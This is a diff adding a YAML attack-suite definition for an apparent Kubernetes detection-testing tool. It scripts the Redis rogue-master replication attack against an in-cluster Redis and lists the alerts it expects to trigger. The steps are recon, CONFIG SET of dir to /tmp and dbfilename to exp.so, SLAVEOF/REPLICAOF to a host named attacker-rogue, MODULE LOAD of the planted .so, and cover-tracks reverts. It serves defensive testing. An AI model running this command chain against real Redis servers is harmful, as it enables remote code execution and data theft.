@@ -1,0 +1,163 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: redis-e2e-02-slaveof-rogue-master
+  description: >-
+    E2E breach scenario 2 — "SLAVEOF rogue master + malicious module load".
+    Premise: attacker from a neighboring pod in the redis namespace stands
+    up a rogue Redis master and coerces the production Redis into
+    replicating from it. The rogue master ships a crafted RDB containing a
+    compiled .so; the attacker then MODULE LOADs it to get native command
+    execution inside redis-server — the classic unauth-RCE path that was
+    the default for years before the Lua UAF era.
+
+    This is an "assume-breach" scenario: the attacker is already *on* the
+    pod network. What we care about is whether the defender notices the
+    anomalous RESP command sequence (CONFIG SET of dir/dbfilename to unusual
+    values, SLAVEOF against an in-cluster IP, MODULE LOAD at all) and the
+    outbound redis-server → attacker-pod TCP flow on the replication port.
+
+    Modeled after:
+      - Knownsec 404 writeup — RCE exploits of Redis based on master-slave
+        replication
+        https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
+      - vulhub/redis-rogue-getshell — reference rogue-master implementation
+        https://github.com/vulhub/redis-rogue-getshell
+      - Mohnad-AL-saif/Redis-4.x-5.x---Unauthenticated-Code-Execution
+        https://github.com/Mohnad-AL-saif/Redis-4.x-5.x---Unauthenticated-Code-Execution
+
+    We do NOT ship a real .so or stand up a real rogue master here — the
+    target Redis is 7.2.10 with module loading typically restricted, so
+    MODULE LOAD is expected to fail at the Redis layer. The value for the
+    test suite is the RESP command sequence: each step is behavior the
+    benign profile should never have learned, so every one should drift.
+
+    Recovery: the final SLAVEOF NO ONE + CONFIG RESETSTAT step restores
+    normal operation so subsequent tests are not perturbed.
+target:
+  service: redis
+  namespace: redis
+  port: 6379
+  protocol: redis
+
+attacks:
+  # ── Phase 1: Recon the replication + module surface ───────────────────────
+  - name: slaveof-recon-replication
+    type: custom
+    redis:
+      command: ["INFO", "replication"]
+    successIndicators:
+      - responseContains: "role:"
+
+  - name: slaveof-recon-modules
+    type: custom
+    redis:
+      command: ["MODULE", "LIST"]
+
+  - name: slaveof-recon-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "GET", "dir"]
+    successIndicators:
+      - responseContains: "dir"
+
+  - name: slaveof-recon-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "GET", "dbfilename"]
+    successIndicators:
+      - responseContains: "dbfilename"
+
+  # ── Phase 2: Stage the destination for the rogue RDB ──────────────────────
+  # Point Redis at /tmp with a .so filename — two drifts from baseline in
+  # one attack (dir change + dbfilename change). A production profile that
+  # captured the real dir (e.g. /data) should flag both.
+  - name: slaveof-stage-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/tmp"]
+    successIndicators:
+      - responseContains: "OK"
+
+  - name: slaveof-stage-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "exp.so"]
+    successIndicators:
+      - responseContains: "OK"
+
+  # ── Phase 3: Pivot to rogue master ────────────────────────────────────────
+  # Point the victim at an attacker-controlled "master". In a real attack
+  # the attacker runs their rogue master on a neighboring pod; here the
+  # address is non-routable on purpose so the target does not actually
+  # pull an RDB, but the outbound attempt itself is the defensive signal.
+  - name: slaveof-pivot-rogue-master
+    type: custom
+    redis:
+      command: ["SLAVEOF", "attacker-rogue.redis.svc.cluster.local", "16379"]
+    successIndicators:
+      - responseContains: "OK"
+
+  # Newer clients prefer REPLICAOF (same wire effect) — an attacker who
+  # profiles the target first may choose whichever keyword their tooling
+  # uses. Exercise both so a detection that only matches "SLAVEOF" by
+  # string isn't falsely reassured.
+  - name: slaveof-pivot-replicaof-alias
+    type: custom
+    redis:
+      command: ["REPLICAOF", "attacker-rogue.redis.svc.cluster.local", "16379"]
+    successIndicators:
+      - responseContains: "OK"
+
+  # ── Phase 4: Attempt module load ──────────────────────────────────────────
+  # MODULE LOAD of an attacker-planted .so is the payoff of the chain. On a
+  # patched 7.2 where enable-module-command is no (default since 7.0) this
+  # will return an error — and that's the signal we want.
+  - name: slaveof-module-load
+    type: custom
+    redis:
+      command: ["MODULE", "LOAD", "/tmp/exp.so"]
+
+  # ── Phase 5: Cover tracks ────────────────────────────────────────────────
+  # A careful attacker reverts the instance so the operator does not
+  # immediately notice the replication flip. The revert itself is benign-
+  # looking at the API layer but appears on top of an already drifted
+  # command history — timeline correlation is the detection here.
+  - name: slaveof-revert-role
+    type: custom
+    redis:
+      command: ["SLAVEOF", "NO", "ONE"]
+    successIndicators:
+      - responseContains: "OK"
+
+  - name: slaveof-revert-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "dump.rdb"]
+
+  - name: slaveof-revert-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/data"]
+
+  - name: slaveof-reset-stats
+    type: custom
+    redis:
+      command: ["CONFIG", "RESETSTAT"]
+
+expectedDetections:
+  # Network egress from redis-server to a non-standard peer on a non-standard
+  # port — if ingress/egress tracers are enabled, the replication handshake
+  # fires here. Rule number depends on runtime config; R0011 is the usual
+  # "unexpected egress" slot in kubescape node-agent.
+  - attackType: custom
+    ruleID: R0011
+    ruleName: "Unexpected egress traffic"
+    containerName: redis
+  # Process/syscall drift — SLAVEOF/MODULE LOAD/CONFIG SET dir paths cause
+  # redis-server to exercise syscalls (connect, open, dlopen attempt) that
+  # the benign profile did not record.
+  - attackType: custom
+    ruleID: R0003
+    ruleName: "Syscalls Anomalies in container"
+    containerName: redis
